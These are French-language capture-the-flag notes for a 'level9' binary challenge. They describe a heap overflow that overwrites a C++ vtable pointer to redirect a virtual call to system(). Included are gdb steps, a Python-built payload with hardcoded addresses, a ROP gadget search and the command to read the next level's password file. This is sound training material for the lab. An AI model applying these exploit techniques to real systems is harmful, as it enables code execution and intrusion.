# Level9 — Commandes

## Connexion

```bash
ssh level9@localhost -p 4242
```

Mot de passe : (dans `level8/flag`)

---

## Recon

```bash
pwd
ls -la
file level9
readelf -h level9
```

Extraction (depuis l’hôte, dans `level9/`) :  
`sshpass -p '<level9_password>' scp -o StrictHostKeyChecking=no -P 4242 level9@localhost:level9 ./level9.bin`

Voir `analysis.md`.

---

## Exploitation (idée)

- **setAnnotation(argv[1])** copie sans limite à partir de **premier+4** → overflow vers le second objet.
- En écrasant le **vptr** du second par **premier+4**, l’appel virtuel exécute ***(premier+4)**. En mettant l’adresse de **system** à **premier+4**, on obtient **system(second)** ; il faut encore que l’argument (second) pointe vers "/bin/sh" (gadget ou placement de la chaîne).
- En **gdb** sur la VM : après le premier **malloc(0x6c)**, noter l’adresse du premier objet ; avec **p system** (ou via libc) noter **system** ; adapter le payload (voir Ressources/ pour exemples et refs).

### Exemple de séquence gdb (adresse du premier objet)

```bash
gdb ./level9
break *0x804861c
run AAAA
# eax = adresse du premier objet (ex. 0x804a008). premier+4 = eax+4
p/x $eax
p system
quit
```

Si le programme sort avant le breakpoint, utiliser `break *0x8048610` (début du bloc après le check argc) puis `c` puis `p/x $eax` après le premier malloc.

Sans gadget, **system(second)** reçoit l’adresse du second objet (dont les 4 premiers octets sont le vptr), pas "/bin/sh" → pas de shell.

**Avec gadget libc** : placer **"/bin/sh"** à **first+8** (0x0804a010) et mettre à **first+4** l’adresse d’un gadget qui fait `system(first+8)` (ex. `pop; pop; push 0x0804a010; push system; ret`). Chercher dans libc avec `ROPgadget` ou `ropper` (sur la VM ou en extrayant libc).

**Alternative (sans gadget)** : mettre **"/bin/sh"** à **second+4** et faire en sorte que l’appel soit **system(second+4)**. Pour cela il faut une entrée de vtable qui pointe vers un tel gadget (ex. dans libc).

Exemple de payload avec **"/bin/sh"** à first+8 (en attendant une adresse de gadget) :

```bash
# Layout: [gadget 4B][/bin/sh 8B][pad 88B][first+4 4B] = 104 puis vptr
# Sans gadget valide, ça ne lance pas le shell ; avec gadget = adresse du gadget en 1er.
./level9 $(python -c 'print "\x60\x86\xd8\xb7" + "/bin/sh\x00" + "A"*92 + "\x0c\xa0\x04\x08"')
```

Remplacer les 4 premiers octets par l’adresse du gadget une fois trouvée (sinon on appelle toujours system(second)).

**Obtenir les maps libc** (éviter `/proc//maps` quand aucun level9 ne tourne) :

```bash
# Lancer level9 en arrière-plan pour avoir un PID
./level9 AAAA &
cat /proc/$!/maps | grep libc
wait
```

Ou dans **gdb** : `run AAAA`, puis `info proc mappings` (ou `shell cat /proc/$(pgrep level9)/maps | grep libc` tant que le processus existe). Sinon utiliser directement le binaire libc : `/lib/i386-linux-gnu/libc.so.6` ou `/lib/libc.so.6`.

Le mot de passe **bonus0** se récupère après obtention d’un shell : `cat /home/user/bonus0/.pass`. Noter dans `level9/flag`.
